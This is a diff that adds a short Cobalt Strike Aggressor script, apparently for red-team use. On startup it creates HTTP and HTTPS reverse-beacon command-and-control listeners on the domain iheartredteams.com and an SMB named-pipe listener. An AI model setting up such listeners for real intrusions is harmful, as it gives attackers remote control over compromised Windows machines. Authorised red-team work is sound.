@@ -1,0 +1,20 @@
+println("
+###################################################################
+ CobaltStrike Aggressor Script          
+ Author:      Joe Vest
+ Description: Headless script to create listeners
+###################################################################");
+
+println('Loading listener_service.cna...');
+
+on ready{
+    println('listener_service.cna: Creating HTTP Listener...');
+	listener_create_ext("HTTP", "windows/beacon_http/reverse_http", %(host => "iheartredteams.com", port => 80, beacons => "iheartredteams.com", althost => "iheartredteams.com", bindto => 80));
+
+    println('listener_service.cna: Creating HTTPS Listener...');
+	listener_create_ext("HTTPS", "windows/beacon_https/reverse_https", %(host => "iheartredteams.com", port => 443, beacons => "iheartredteams.com", althost => "iheartredteams.com", bindto => 443));
+
+    println('listener_service.cna: Creating SMB Listener...');
+	listener_create_ext("SMB", "windows/beacon_bind_pipe", %(port => "mojo.5887.8051.34782273429370473##"));
+	sleep(10000);
+}
